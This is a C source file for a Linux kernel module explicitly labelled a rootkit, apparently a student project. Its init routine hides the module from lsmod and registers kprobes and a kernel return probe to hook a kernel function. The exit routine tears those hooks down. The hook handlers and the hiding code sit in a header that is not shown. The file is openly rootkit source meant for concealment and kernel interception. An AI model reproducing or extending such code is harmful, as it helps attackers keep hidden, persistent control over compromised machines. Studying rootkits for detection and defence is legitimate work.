#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("HOOOKING");
MODULE_AUTHOR("2600 student");
MODULE_VERSION("0.0.1");

static int __init rootkit_init(void) {
  printk(KERN_INFO "rootkit: init\n");
  hide_from_lsmod();
  kprobes_init();
  int kpret = register_kretprobe(&rootkit_kretprobe);
  if (kpret < 0) {
    printk(KERN_INFO "Error registering kretprobe: %d\n", kpret);
    return -1;
  }
  printk(KERN_INFO "Planted return probe at %s: %p\n",
        rootkit_kretprobe.kp.symbol_name, rootkit_kretprobe.kp.addr);
  return 0;
}

static void __exit rootkit_exit(void) {
  printk(KERN_INFO "rootkit: exit\n");
  kprobes_exit();
  unregister_kretprobe(&rootkit_kretprobe);
  printk(KERN_INFO "kretprobe at %p unregistered\n",
        rootkit_kretprobe.kp.addr);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

